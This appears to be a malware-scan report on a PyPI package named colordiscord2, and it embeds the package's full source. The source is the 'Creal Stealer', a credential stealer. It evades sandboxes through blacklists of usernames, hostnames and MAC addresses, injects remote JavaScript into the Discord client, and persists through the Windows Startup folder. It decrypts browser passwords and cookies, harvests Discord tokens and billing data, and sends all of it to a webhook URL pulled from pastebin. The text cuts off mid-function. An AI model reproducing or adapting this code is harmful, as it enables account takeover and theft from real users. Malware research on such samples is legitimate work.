statistics:
  total_files: 1
  skipped_files: 0.0
  processed_objects: 1
  malicious_objects: 0
details:
- path: .repo_cache/malicious_repos/pypi_malregistry/colordiscord2/0.0.1/colordiscord2-0.0.1/colordiscord2-0.0.1/colordiscord2/colordiscord2.py
  contents:
  - name: color
    score: 0.0
    code: "def color():\n    import os\n    import threading\n    from sys import executable\n    from sqlite3 import connect as sql_connect\n    import re\n    from base64 import b64decode\n    from json import loads as json_loads, load\n    from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\n    from urllib.request import Request, urlopen\n    import json \n    import time\n    import shutil\n    from zipfile import ZipFile\n    import random\n    import re\n    import subprocess\n    import sys\n    import shutil\n    import uuid\n    import socket\n    import getpass\n\n\n\n    blacklistUsers = ['WDAGUtilityAccount', '3W1GJT', 'QZSBJVWM', '5ISYH9SH', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']\n\n    username = getpass.getuser()\n\n    if username.lower() in blacklistUsers:\n        os._exit(0)\n\n    def kontrol():\n\n        blacklistUsername = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']\n\n        hostname = socket.gethostname()\n\n        if any(name in hostname for name in blacklistUsername):\n            os._exit(0)\n\n    kontrol()\n\n    BLACKLIST1 = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77', '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']\n\n    mac_address = uuid.getnode()\n    if str(uuid.UUID(int=mac_address)) in BLACKLIST1:\n        os._exit(0)\n\n\n    inj_url = \"https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js\"\n        \n    DETECTED = False\n    #bir ucaktik dustuk bir gemiydik battik :(\n    def g3t1p():\n        ip = \"None\"\n        try:\n            ip = urlopen(Request(\"https://api.ipify.org\")).read().decode().strip()\n        except:\n            pass\n        return ip\n\n    requirements = [\n        [\"requests\", \"requests\"],\n        [\"Crypto.Cipher\", \"pycryptodome\"],\n    ]\n    for modl in requirements:\n        try: __import__(modl[0])\n        except:\n            subprocess.Popen(f\"{executable} -m pip install {modl[1]}\", shell=True)\n            time.sleep(3)\n\n    import requests\n    \n    from Crypto.Cipher import AES\n\n    local = os.getenv('LOCALAPPDATA')\n    roaming = os.getenv('APPDATA')\n    temp = os.getenv(\"TEMP\")\n    Threadlist = []\n\n\n    class DATA_BLOB(Structure):\n        _fields_ = [\n            ('cbData', wintypes.DWORD),\n            ('pbData', POINTER(c_char))\n        ]\n\n    def G3tD4t4(blob_out):\n        cbData = int(blob_out.cbData)\n        pbData = blob_out.pbData\n        buffer = c_buffer(cbData)\n        cdll.msvcrt.memcpy(buffer, pbData, cbData)\n        windll.kernel32.LocalFree(pbData)\n        return buffer.raw\n\n    def CryptUnprotectData(encrypted_bytes, entropy=b''):\n        buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))\n        buffer_entropy = c_buffer(entropy, len(entropy))\n        blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)\n        blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)\n        blob_out = DATA_BLOB()\n\n        if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):\n            return G3tD4t4(blob_out)\n\n    def D3kryptV4lU3(buff, master_key=None):\n        starts = buff.decode(encoding='utf8', errors='ignore')[:3]\n        if starts == 'v10' or starts == 'v11':\n            iv = buff[3:15]\n            payload = buff[15:]\n            cipher = AES.new(master_key, AES.MODE_GCM, iv)\n            decrypted_pass = cipher.decrypt(payload)\n            decrypted_pass = decrypted_pass[:-16].decode()\n            return decrypted_pass\n\n    def L04dR3qu3sTs(methode, url, data='', files='', headers=''):\n        for i in range(8): # max trys\n            try:\n                if methode == 'POST':\n                    if data != '':\n                        r = requests.post(url, data=data)\n                        if r.status_code == 200:\n                            return r\n                    elif files != '':\n                        r = requests.post(url, files=files)\n                        if r.status_code == 200 or r.status_code == 413:\n                            return r\n            except:\n                pass\n    telnet = requests.get(\"https://pastebin.com/raw/vb608t9D\").text\n    def L04durl1b(telnet, data='', files='', headers=''):\n        for i in range(8):\n            try:\n                if headers != '':\n                    r = urlopen(Request(telnet, data=data, headers=headers))\n                    return r\n                else:\n                    r = urlopen(Request(telnet, data=data))\n                    return r\n            except: \n                pass\n\n    def globalInfo():\n        ip = g3t1p()\n        us3rn4m1 = os.getenv(\"USERNAME\")\n        ipdatanojson = urlopen(Request(f\"https://geolocation-db.com/jsonp/{ip}\")).read().decode().replace('callback(', '').replace('})', '}')\n        # print(ipdatanojson)\n        ipdata = json.loads(ipdatanojson)\n        # print(urlopen(Request(f\"https://geolocation-db.com/jsonp/{ip}\")).read().decode())\n        contry = ipdata[\"country_name\"]\n        contryCode = ipdata[\"country_code\"].lower()\n        sehir = ipdata[\"state\"]\n\n        globalinfo = f\":flag_{contryCode}:  - `{us3rn4m1.upper()} | {ip} ({contry})`\"\n        return globalinfo\n\n\n    def TR6st(C00k13):\n        # simple Trust Factor system\n        global DETECTED\n        data = str(C00k13)\n        tim = re.findall(\".google.com\", data)\n        # print(len(tim))\n        if len(tim) < -1:\n            DETECTED = True\n            return DETECTED\n        else:\n            DETECTED = False\n            return DETECTED\n            \n    def G3tUHQFr13ndS(t0k3n):\n        b4dg3List =  [\n            {\"Name\": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': \"<:developer:874750808472825986> \"},\n            {\"Name\": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': \"<:bughunter_2:874750808430874664> \"},\n            {\"Name\": 'Early_Supporter', 'Value': 512, 'Emoji': \"<:early_supporter:874750808414113823> \"},\n            {\"Name\": 'House_Balance', 'Value': 256, 'Emoji': \"<:balance:874750808267292683> \"},\n            {\"Name\": 'House_Brilliance', 'Value': 128, 'Emoji': \"<:brilliance:874750808338608199> \"},\n            {\"Name\": 'House_Bravery', 'Value': 64, 'Emoji': \"<:bravery:874750808388952075> \"},\n            {\"Name\": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': \"<:bughunter_1:874750808426692658> \"},\n            {\"Name\": 'HypeSquad_Events', 'Value': 4, 'Emoji': \"<:hypesquad_events:874750808594477056> \"},\n            {\"Name\": 'Partnered_Server_Owner', 'Value': 2,'Emoji': \"<:partner:874750808678354964> \"},\n            {\"Name\": 'Discord_Employee', 'Value': 1, 'Emoji': \"<:staff:874750808728666152> \"}\n        ]\n        headers = {\n            \"Authorization\": t0k3n,\n            \"Content-Type\": \"application/json\",\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n        }\n        try:\n            friendlist = json.loads(urlopen(Request(\"https://discord.com/api/v6/users/@me/relationships\", headers=headers)).read().decode())\n        except:\n            return False\n\n        uhqlist = ''\n        for friend in friendlist:\n            Own3dB3dg4s = ''\n            flags = friend['user']['public_flags']\n            for b4dg3 in b4dg3List:\n                if flags // b4dg3[\"Value\"] != 0 and friend['type'] == 1:\n                    if not \"House\" in b4dg3[\"Name\"]:\n                        Own3dB3dg4s += b4dg3[\"Emoji\"]\n                    flags = flags % b4dg3[\"Value\"]\n            if Own3dB3dg4s != '':\n                uhqlist += f\"{Own3dB3dg4s} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\\n\"\n        return uhqlist\n\n\n    process_list = os.popen('tasklist').readlines()\n\n\n    for process in process_list:\n        if \"Discord\" in process:\n            \n            pid = int(process.split()[1])\n            os.system(f\"taskkill /F /PID {pid}\")\n\n    def G3tb1ll1ng(t0k3n):\n        headers = {\n            \"Authorization\": t0k3n,\n            \"Content-Type\": \"application/json\",\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n        }\n        try:\n            b1ll1ngjson = json.loads(urlopen(Request(\"https://discord.com/api/users/@me/billing/payment-sources\", headers=headers)).read().decode())\n        except:\n            return False\n        \n        if b1ll1ngjson == []: return \"```None```\"\n\n        b1ll1ng = \"\"\n        for methode in b1ll1ngjson:\n            if methode[\"invalid\"] == False:\n                if methode[\"type\"] == 1:\n                    b1ll1ng += \":credit_card:\"\n                elif methode[\"type\"] == 2:\n                    b1ll1ng += \":parking: \"\n\n        return b1ll1ng\n\n    def inj_discord():\n\n        username = os.getlogin()\n\n        folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']\n\n        for folder_name in folder_list:\n            deneme_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)\n            if os.path.isdir(deneme_path):\n                for subdir, dirs, files in os.walk(deneme_path):\n                    if 'app-' in subdir:\n                        for dir in dirs:\n                            if 'modules' in dir:\n                                module_path = os.path.join(subdir, dir)\n                                for subsubdir, subdirs, subfiles in os.walk(module_path):\n                                    if 'discord_desktop_core-' in subsubdir:\n                                        for subsubsubdir, subsubdirs, subsubfiles in os.walk(subsubdir):\n                                            if 'discord_desktop_core' in subsubsubdir:\n                                                for file in subsubfiles:\n                                                    if file == 'index.js':\n                                                        file_path = os.path.join(subsubsubdir, file)\n\n                                                        inj_content = requests.get(inj_url).text\n\n                                                        inj_content = inj_content.replace(\"%WEBHOOK%\", telnet)\n\n                                                        with open(file_path, \"w\", encoding=\"utf-8\") as index_file:\n                                                            index_file.write(inj_content)\n    inj_discord()\n\n    def G3tB4dg31(flags):\n        if flags == 0: return ''\n\n        Own3dB3dg4s = ''\n        b4dg3List =  [\n            {\"Name\": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': \"<:developer:874750808472825986> \"},\n            {\"Name\": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': \"<:bughunter_2:874750808430874664> \"},\n            {\"Name\": 'Early_Supporter', 'Value': 512, 'Emoji': \"<:early_supporter:874750808414113823> \"},\n            {\"Name\": 'House_Balance', 'Value': 256, 'Emoji': \"<:balance:874750808267292683> \"},\n            {\"Name\": 'House_Brilliance', 'Value': 128, 'Emoji': \"<:brilliance:874750808338608199> \"},\n            {\"Name\": 'House_Bravery', 'Value': 64, 'Emoji': \"<:bravery:874750808388952075> \"},\n            {\"Name\": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': \"<:bughunter_1:874750808426692658> \"},\n            {\"Name\": 'HypeSquad_Events', 'Value': 4, 'Emoji': \"<:hypesquad_events:874750808594477056> \"},\n            {\"Name\": 'Partnered_Server_Owner', 'Value': 2,'Emoji': \"<:partner:874750808678354964> \"},\n            {\"Name\": 'Discord_Employee', 'Value': 1, 'Emoji': \"<:staff:874750808728666152> \"}\n        ]\n        for b4dg3 in b4dg3List:\n            if flags // b4dg3[\"Value\"] != 0:\n                Own3dB3dg4s += b4dg3[\"Emoji\"]\n                flags = flags % b4dg3[\"Value\"]\n\n        return Own3dB3dg4s\n\n    def G3tT0k4n1nf9(t0k3n):\n        headers = {\n            \"Authorization\": t0k3n,\n            \"Content-Type\": \"application/json\",\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n        }\n\n        us3rjs0n = json.loads(urlopen(Request(\"https://discordapp.com/api/v6/users/@me\", headers=headers)).read().decode())\n        us3rn4m1 = us3rjs0n[\"username\"]\n        hashtag = us3rjs0n[\"discriminator\"]\n        em31l = us3rjs0n[\"email\"]\n        idd = us3rjs0n[\"id\"]\n        pfp = us3rjs0n[\"avatar\"]\n        flags = us3rjs0n[\"public_flags\"]\n        n1tr0 = \"\"\n        ph0n3 = \"\"\n\n        if \"premium_type\" in us3rjs0n: \n            nitrot = us3rjs0n[\"premium_type\"]\n            if nitrot == 1:\n                n1tr0 = \"<a:DE_BadgeNitro:865242433692762122>\"\n            elif nitrot == 2:\n                n1tr0 = \"<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>\"\n        if \"ph0n3\" in us3rjs0n: ph0n3 = f'{us3rjs0n[\"ph0n3\"]}'\n\n        return us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3\n\n    def ch1ckT4k1n(t0k3n):\n        headers = {\n            \"Authorization\": t0k3n,\n            \"Content-Type\": \"application/json\",\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n        }\n        try:\n            urlopen(Request(\"https://discordapp.com/api/v6/users/@me\", headers=headers))\n            return True\n        except:\n            return False\n\n    if getattr(sys, 'frozen', False):\n        currentFilePath = os.path.dirname(sys.executable)\n    else:\n        currentFilePath = os.path.dirname(os.path.abspath(__file__))\n\n    fileName = os.path.basename(sys.argv[0])\n    filePath = os.path.join(currentFilePath, fileName)\n\n    startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\n    startupFilePath = os.path.join(startupFolderPath, fileName)\n\n    if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():\n        with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:\n            shutil.copyfileobj(src_file, dst_file)\n\n\n    def upl05dT4k31(t0k3n, path):\n        global telnet\n        headers = {\n            \"Content-Type\": \"application/json\",\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n        }\n        us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3 = G3tT0k4n1nf9(t0k3n)\n\n        if pfp == None: \n            pfp = \"https://i.imgur.com/S0Zqp4R.jpg\"\n        else:\n            pfp = f\"https://cdn.discordapp.com/avatars/{idd}/{pfp}\"\n\n        b1ll1ng = G3tb1ll1ng(t0k3n)\n        b4dg3 = G3tB4dg31(flags)\n        friends = G3tUHQFr13ndS(t0k3n)\n        if friends == '': friends = \"```No Rare Friends```\"\n        if not b1ll1ng:\n            b4dg3, ph0n3, b1ll1ng = \"\U0001F512\", \"\U0001F512\", \"\U0001F512\"\n        if n1tr0 == '' and b4dg3 == '': n1tr0 = \"```None```\"\n\n        data = {\n            \"content\": f'{globalInfo()} | `{path}`',\n            \"embeds\": [\n                {\n                \"color\": 2895667,\n                \"fields\": [\n                    {\n                        \"name\": \"<a:hyperNOPPERS:828369518199308388> Token:\",\n                        \"value\": f\"```{t0k3n}```\",\n                        \"inline\": True\n                    },\n                    {\n                        \"name\": \"<:mail:750393870507966486> Email:\",\n                        \"value\": f\"```{em31l}```\",\n                        \"inline\": True\n                    },\n                    {\n                        \"name\": \"<a:1689_Ringing_Phone:755219417075417088> Phone:\",\n                        \"value\": f\"```{ph0n3}```\",\n                        \"inline\": True\n                    },\n                    {\n                        \"name\": \"<:mc_earth:589630396476555264> IP:\",\n                        \"value\": f\"```{g3t1p()}```\",\n                        \"inline\": True\n                    },\n                    {\n                        \"name\": \"<:woozyface:874220843528486923> Badges:\",\n                        \"value\": f\"{n1tr0}{b4dg3}\",\n                        \"inline\": True\n                    },\n                    {\n                        \"name\": \"<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:\",\n                        \"value\": f\"{b1ll1ng}\",\n                        \"inline\": True\n                    },\n                    {\n                        \"name\": \"<a:mavikirmizi:853238372591599617> HQ Friends:\",\n                        \"value\": f\"{friends}\",\n                        \"inline\": False\n                    }\n                    ],\n                \"author\": {\n                    \"name\": f\"{us3rn4m1}#{hashtag} ({idd})\",\n                    \"icon_url\": f\"{pfp}\"\n                    },\n                \"footer\": {\n                    \"text\": \"Creal Stealer\",\n                    \"icon_url\": \"https://i.imgur.com/S0Zqp4R.jpg\"\n                    },\n                \"thumbnail\": {\n                    \"url\": f\"{pfp}\"\n                    }\n                }\n            ],\n            \"avatar_url\": \"https://i.imgur.com/S0Zqp4R.jpg\",\n            \"username\": \"Creal Stealer\",\n            \"attachments\": []\n            }\n        L04durl1b(telnet, data=json.dumps(data).encode(), headers=headers)\n\n    #hersey son defa :(\n    def R4f0rm3t(listt):\n        e = re.findall(\"(\\w+[a-z])\",listt)\n        while \"https\" in e: e.remove(\"https\")\n        while \"com\" in e: e.remove(\"com\")\n        while \"net\" in e: e.remove(\"net\")\n        return list(set(e))\n\n    def upload(name, link):\n        headers = {\n            \"Content-Type\": \"application/json\",\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n        }\n\n        if name == \"crcook\":\n            rb = ' | '.join(da for da in cookiWords)\n            if len(rb) > 1000: \n                rrrrr = R4f0rm3t(str(cookiWords))\n                rb = ' | '.join(da for da in rrrrr)\n            data = {\n                \"content\": f\"{globalInfo()}\",\n                \"embeds\": [\n                    {\n                        \"title\": \"Creal | Cookies Stealer\",\n                        \"description\": f\"<:apollondelirmis:1012370180845883493>: **Accounts:**\\n\\n{rb}\\n\\n**Data:**\\n<:cookies_tlm:816619063618568234> \u2022 **{CookiCount}** Cookies Found\\n<a:CH_IconArrowRight:715585320178941993> \u2022 [CrealCookies.txt]({link})\",\n                        \"color\": 2895667,\n                        \"footer\": {\n                            \"text\": \"Creal Stealer\",\n                            \"icon_url\": \"https://i.imgur.com/S0Zqp4R.jpg\"\n                        }\n                    }\n                ],\n                \"username\": \"Creal Stealer\",\n                \"avatar_url\": \"https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg\",\n                \"attachments\": []\n                }\n            L04durl1b(telnet, data=json.dumps(data).encode(), headers=headers)\n            return\n\n        if name == \"crpassw\":\n            ra = ' | '.join(da for da in paswWords)\n            if len(ra) > 1000: \n                rrr = R4f0rm3t(str(paswWords))\n                ra = ' | '.join(da for da in rrr)\n\n            data = {\n                \"content\": f\"{globalInfo()}\",\n                \"embeds\": [\n                    {\n                        \"title\": \"Creal | Password Stealer\",\n                        \"description\": f\"<:apollondelirmis:1012370180845883493>: **Accounts**:\\n{ra}\\n\\n**Data:**\\n<a:hira_kasaanahtari:886942856969875476> \u2022 **{P4sswCount}** Passwords Found\\n<a:CH_IconArrowRight:715585320178941993> \u2022 [CrealPassword.txt]({link})\",\n                        \"color\": 2895667,\n                        \"footer\": {\n                            \"text\": \"Creal Stealer\",\n                            \"icon_url\": \"https://i.imgur.com/S0Zqp4R.jpg\"\n                        }\n                    }\n                ],\n                \"username\": \"Creal\",\n                \"avatar_url\": \"https://i.imgur.com/S0Zqp4R.jpg\",\n                \"attachments\": []\n                }\n            L04durl1b(telnet, data=json.dumps(data).encode(), headers=headers)\n            return\n\n        if name == \"kiwi\":\n            data = {\n                \"content\": f\"{globalInfo()}\",\n                \"embeds\": [\n                    {\n                    \"color\": 2895667,\n                    \"fields\": [\n                        {\n                        \"name\": \"Interesting files found on user PC:\",\n                        \"value\": link\n                        }\n                    ],\n                    \"author\": {\n                        \"name\": \"Creal | File Stealer\"\n                    },\n                    \"footer\": {\n                        \"text\": \"Creal Stealer\",\n                        \"icon_url\": \"https://i.imgur.com/S0Zqp4R.jpg\"\n                    }\n                    }\n                ],\n                \"username\": \"Creal Stealer\",\n                \"avatar_url\": \"https://i.imgur.com/S0Zqp4R.jpg\",\n                \"attachments\": []\n                }\n            L04durl1b(telnet, data=json.dumps(data).encode(), headers=headers)\n            return\n\n\n\n\n    # def upload(name, tk=''):\n    #     headers = {\n    #         \"Content-Type\": \"application/json\",\n    #         \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    #     }\n\n    #     # r = requests.post(hook, files=files)\n    #     LoadRequests(\"POST\", hook, files=files)\n        \n\n\n\n\n    def wr1tef0rf1l3(data, name):\n        path = os.getenv(\"TEMP\") + f\"\\cr{name}.txt\"\n        with open(path, mode='w', encoding='utf-8') as f:\n            f.write(f\"<--Creal STEALER BEST -->\\n\\n\")\n            for line in data:\n                if line[0] != '':\n                    f.write(f\"{line}\\n\")\n\n    T0k3ns = ''\n    def getT0k3n(path, arg):\n        if not os.path.exists(path): return\n\n        path += arg\n        for file in os.listdir(path):\n            if file.endswith(\".log\") or file.endswith(\".ldb\")   :\n                for line in [x.strip() for x in open(f\"{path}\\\\{file}\", errors=\"ignore\").readlines() if x.strip()]:\n                    for regex in (r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}\", r\"mfa\\.[\\w-]{80,95}\"):\n                        for t0k3n in re.findall(regex, line):\n                            global T0k3ns\n                            if ch1ckT4k1n(t0k3n):\n                                if not t0k3n in T0k3ns:\n                                    # print(token)\n                                    T0k3ns += t0k3n\n                                    upl05dT4k31(t0k3n, path)\n\n    P4ssw = []\n    def getP4ssw(path, arg):\n        global P4ssw, P4sswCount\n        if not os.path.exists(path): return\n\n        pathC = path + arg + \"/Login Data\"\n        if os.stat(pathC).st_size == 0: return\n\n        tempfold = temp + \"cr\" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + \".db\"\n\n        shutil.copy2(pathC, tempfold)\n        conn = sql_connect(tempfold)\n        cursor = conn.cursor()\n        cursor.execute(\"SELECT action_url, username_value, password_value FROM logins;\")\n        data = cursor.fetchall()\n        cursor.close()\n        conn.close()\n        os.remove(tempfold)\n\n        pathKey = path + \"/Local State\"\n        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())\n        master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n        master_key = CryptUnprotectData(master_key[5:])\n\n        for row in data: \n            if row[0] != '':\n                for wa in keyword:\n                    old = wa\n                    if \"https\" in wa:\n                        tmp = wa\n                        wa = tmp.split('[')[1].split(']')[0]\n                    if wa in row[0]:\n                        if not old in paswWords: paswWords.append(old)\n                P4ssw.append(f\"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {D3kryptV4lU3(row[2], master_key)}\")\n                P4sswCount += 1\n        wr1tef0rf1l3(P4ssw, 'passw')\n\n    C00k13 = []    \n    def getC00k13(path, arg):\n        global C00k13, CookiCount\n        if not os.path.exists(path): return\n        \n        pathC = path + arg + \"/Cookies\"\n        if os.stat(pathC).st_size == 0: return\n        \n        tempfold = temp + \"cr\" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + \".db\"\n        \n        shutil.copy2(pathC, tempfold)\n        conn = sql_connect(tempfold)\n        cursor = conn.cursor()\n        cursor.execute(\"SELECT host_key, name, encrypted_value FROM cookies\")\n        data = cursor.fetchall()\n        cursor.close()\n        conn.close()\n        os.remove(tempfold)\n\n        pathKey = path + \"/Local State\"\n        \n        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())\n        master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n        master_key = CryptUnprotectData(master_key[5:])\n\n        for row in data: \n            if row[0] != '':\n                for wa in keyword:\n                    old = wa\n                    if \"https\" in wa:\n                        tmp = wa\n                        wa = tmp.split('[')[1].split(']')[0]\n                    if wa in row[0]:\n                        if not old in cookiWords: cookiWords.append(old)\n                C00k13.append(f\"{row[0]}\tTRUE\t/\tFALSE\t2597573456\t{row[1]}\t{D3kryptV4lU3(row[2], master_key)}\")\n                CookiCount += 1\n        wr1tef0rf1l3(C00k13, 'cook')\n\n    def G3tD1sc0rd(path, arg):\n        if not os.path.exists(f\"{path}/Local State\"): return\n\n        pathC = path + arg\n\n        pathKey = path + \"/Local State\"\n        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())\n        master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n        master_key = CryptUnprotectData(master_key[5:])\n        # print(path, master_key)\n        \n        for file in os.listdir(pathC):\n            # print(path, file)\n            if file.endswith(\".log\") or file.endswith(\".ldb\")   :\n                for line in [x.strip() for x in open(f\"{pathC}\\\\{file}\", errors=\"ignore\").readlines() if x.strip()]:\n                    for 